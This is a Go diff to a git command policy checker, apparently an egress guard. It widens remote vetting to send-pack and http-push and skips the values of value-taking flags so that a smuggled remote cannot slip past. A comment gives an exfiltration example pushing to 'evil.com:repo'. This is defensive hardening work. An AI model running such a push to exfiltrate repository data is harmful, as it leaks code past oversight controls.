@@ -104,12 +104,14 @@ func (p Policy) RemoteRefs(args []string) (refs []string, usesDefault bool) {
 
 	sub := args[idx]
 	switch sub {
-	case "push", "fetch", "pull", "clone", "remote":
+	// send-pack / http-push are low-level push plumbing whose first positional is
+	// the destination remote — they exfil just like push and must be vetted too.
+	case "push", "fetch", "pull", "clone", "remote", "send-pack", "http-push":
 	default:
 		return nil, false
 	}
 
-	pos := positionals(args[idx+1:])
+	pos := positionalsFor(sub, args[idx+1:])
 
 	switch sub {
 	case "clone":
@@ -128,33 +130,91 @@ func (p Policy) RemoteRefs(args []string) (refs []string, usesDefault bool) {
 		}
 
 		return urls, false
-	default: // push / fetch / pull: the first positional is the remote (name or URL)
+	default: // push/fetch/pull/send-pack/http-push: first positional is the remote
 		if len(pos) == 0 {
 			return nil, true
 		}
 
-		return pos[:1], false
+		// The first positional is the remote. Also vet any OTHER positional that
+		// is itself a remote URL, so a value-flag desync cannot smuggle an exfil
+		// URL past the check (e.g. `push -o opt evil.com:repo`).
+		refs = pos[:1]
+
+		for _, a := range pos[1:] {
+			if IsRemoteURL(a) {
+				refs = append(refs, a)
+			}
+		}
+
+		return refs, false
 	}
+}
+
+// valueConsumingFlags lists, per remote-facing subcommand, the flags that take a
+// SEPARATE value argument (the space form, e.g. `-o opt`). That value must be
+// skipped when locating positionals, else it is mistaken for the remote (SEC-3).
+// The `--flag=value` form carries its own value and never consumes the next
+// token, so it is not matched here.
+var valueConsumingFlags = map[string]map[string]bool{
+	"push": flagSet("-o", "--push-option", "--receive-pack", "--exec", "--repo",
+		"--force-with-lease"),
+	"fetch": flagSet("--upload-pack", "--exec", "--depth", "--deepen", "--refmap",
+		"--shallow-since", "--shallow-exclude", "--negotiation-tip", "--server-option", "-o"),
+	"pull": flagSet("--upload-pack", "--exec", "--depth", "--deepen", "-s", "--strategy",
+		"-X", "--strategy-option", "--shallow-since", "--shallow-exclude", "--server-option"),
+	"send-pack": flagSet("--receive-pack", "--exec", "--max-pack-size"),
+	"http-push": flagSet(),
+	"clone": flagSet("-u", "--upload-pack", "-b", "--branch", "-o", "--origin", "-c", "--config",
+		"--reference", "--reference-if-able", "--depth", "--template", "-j", "--jobs",
+		"--filter", "--separate-git-dir", "--shallow-since", "--shallow-exclude",
+		"--server-option", "--bundle-uri"),
+}
+
+// flagSet builds a set from flag names.
+func flagSet(names ...string) map[string]bool {
+	m := make(map[string]bool, len(names))
+	for _, n := range names {
+		m[n] = true
+	}
+
+	return m
+}
+
+// positionalsFor returns the non-flag arguments for a subcommand, skipping the
+// values of that subcommand's value-consuming flags (space form) and treating a
+// bare `--` as the end of options. This locates the true remote positional even
+// when preceded by a value flag.
+func positionalsFor(sub string, args []string) []string {
+	consumes := valueConsumingFlags[sub]
+
+	var out []string
+
+	for i := 0; i < len(args); i++ {
+		a := args[i]
+
+		if a == "--" {
+			out = append(out, args[i+1:]...)
+			break
+		}
+
+		if strings.HasPrefix(a, "-") {
+			if consumes[a] && i+1 < len(args) {
+				i++ // skip this flag's separate value
+			}
+
+			continue
+		}
+
+		out = append(out, a)
+	}
+
+	return out
 }
 
 // IsRemoteURL reports whether s is a network git remote URL (scheme:// or
 // scp-style git@host:path) rather than a configured remote name or local path.
 func IsRemoteURL(s string) bool {
 	return looksLikeRemoteURL(s)
-}
-
-// positionals returns the non-flag arguments (drops any token starting with
-// '-'); enough to locate the remote positional.
-func positionals(args []string) []string {
-	var out []string
-
-	for _, a := range args {
-		if !strings.HasPrefix(a, "-") {
-			out = append(out, a)
-		}
-	}
-
-	return out
 }
 
 // RemoteAllowed reports whether a remote URL's host (or host/owner) is permitted.
